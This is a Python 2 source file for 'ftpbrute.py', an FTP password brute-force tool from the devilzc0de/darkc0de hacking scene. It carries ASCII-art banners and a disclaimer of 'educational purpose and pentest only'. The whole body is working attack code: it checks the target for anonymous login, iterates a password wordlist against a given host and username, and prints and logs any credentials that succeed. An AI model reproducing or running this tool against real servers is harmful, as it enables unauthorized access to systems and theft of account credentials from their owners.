#!/usr/bin/python
# -*- coding: utf-8 -*-
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################
# This is ftp brute force tools [Updated].
# This was written for educational purpose and pentest only. Use it at your own risk.
# Update : More efficient
#	 : prevent loss added 
#	 : Anonymous checker added
# VISIT : http://www.devilzc0de.com
# CODING BY : gunslinger_
# EMAIL : gunslinger.devilzc0de@gmail.com
# TOOL NAME : ftpbrute.py v1.5
# Big thanks darkc0de member : d3hydr8, Kopele, icedzomby, VMw4r3 and all member
# Special thanks to devilzc0de crew : mywisdom, petimati, peneter, flyff666, rotlez, 7460, xtr0nic, devil_nongkrong, cruzen and all devilzc0de family 
# Greetz : all member of jasakom.com, jatimcrew.com
# Special i made for jasakom member and devilzc0de family
# Please remember... your action will be logged in target system...
# Author will not be responsible for any damage !!
# Use it with your own risk 

import sys
import time
import os
from ftplib import FTP

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

log = "ftpbrute.log"
face = 	'''
           .___             .__ .__                  _______       .___                                       				
         __| _/ ____ ___  __|__||  |  ________  ____ \   _  \    __| _/ ____     ____ _______   ____ __  _  __				
        / __ |_/ __ \\\  \/ /|  ||  |  \___   /_/ ___\/  /_\  \  / __ |_/ __ \  _/ ___\\\_  __ \_/ __ \\\ \/ \/ /				
       / /_/ |\  ___/ \   / |  ||  |__ /    / \  \___\  \_/   \/ /_/ |\  ___/  \  \___ |  | \/\  ___/ \     / 				
       \____ | \___  > \_/  |__||____//_____ \ \___  >\_____  /\____ | \___  >  \___  >|__|    \___  > \/\_/  				
            \/     \/                       \/     \/       \/      \/     \/       \/             \/         				
												http://www.devilzc0de.com			
												by : gunslinger_				
ftpbrute.py version 1.0                                     											
Brute forcing ftp target     															
Programmmer : gunslinger_                                    											
gunslinger[at]devilzc0de[dot]com                             											
_____________________________________________________________________________________________________________________________________________ 
'''

option = '''
Usage: ./ftpbrute.py [options]
Options: -t, --target    <hostname/ip>   |   Target to bruteforcing 
         -u, --user      <user>          |   User for bruteforcing
         -w, --wordlist  <filename>      |   Wordlist used for bruteforcing
         -h, --help      <help>          |   print this help
                                        					
Example: ./ftpbrute.py -t 192.168.1.1 -u root -w wordlist.txt

'''

file = open(log, "a")

def MyFace() :
	os.system(SysCls)
	print face
	file.write(face)


def HelpMe() :
	MyFace()
	print option
	file.write(option)
	sys.exit(1)

for arg in sys.argv:
	if arg.lower() == '-t' or arg.lower() == '--target':
            hostname = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-u' or arg.lower() == '--user':
            user = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-w' or arg.lower() == '--wordlist':
            wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
	elif arg.lower() == '-h' or arg.lower() == '--help':
        	HelpMe()
	elif len(sys.argv) <= 1:
		HelpMe()
		
def checkanony() : 
	try:
		print "\n[+] Checking for anonymous login\n"
		ftp = FTP(hostname)
		ftp.login()
		ftp.retrlines('LIST')
		print "\n[!] Anonymous login successfuly !\n"
		ftp.quit()
	except Exception, e:
        	print "\n[-] Anonymous login unsuccessful...\n"
		pass
        

def BruteForce(word) :
	sys.stdout.write ("\r[?]Trying : %s " % (word))
	sys.stdout.flush()
	file.write("\n[?]Trying :"+word)
     	try:
		ftp = FTP(hostname)
		ftp.login(user, word)
		ftp.retrlines('list')
		ftp.quit()
		print "\n\t[!] Login Success ! "
		print "\t[!] Username : ",user, ""
		print "\t[!] Password : ",word, ""
		print "\t[!] Hostname : ",hostname, ""
		print "\t[!] Log all has been saved to",log,"\n"
		file.write("\n\n\t[!] Login Success ! ")
		file.write("\n\t[!] Username : "+user )
		file.write("\n\t[!] Password : "+word )
		file.write("\n\t[!] Hostname : "+hostname)
		file.write("\n\t[!] Log all has been saved to "+log)
		sys.exit(1)
   	except Exception, e:
        	#print "[-] Failed"
		pass
	except KeyboardInterrupt:
		print "\n[-] Aborting...\n"
		file.write("\n[-] Aborting...\n")
		sys.exit(1)
	
MyFace()
print "[!] Starting attack at %s" % time.strftime("%X")
print "[!] System Activated for brute forcing..."
print "[!] Please wait until brute forcing finish !\n"
file.write("\n[!] Starting attack at %s" % time.strftime("%X"))
file.write("\n[!] System Activated for brute forcing...")
file.write("\n[!] Please wait until brute forcing finish !\n")
checkanony()	

try:
	preventstrokes = open(wordlist, "r")
	words 	       = preventstrokes.readlines()
	count          = 0 
	while count < len(words): 
		words[count] = words[count].strip() 
		count += 1 
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
	file.write("\n[-] Error: Check your wordlist path\n")
  	sys.exit(1)

print "\n[+] Loaded:",len(words),"words"
print "[+] Server :",hostname
print "[+] User :",user
print "[+] BruteForcing...\n"

for word in words:
	BruteForce(word.replace("\n",""))

file.close()

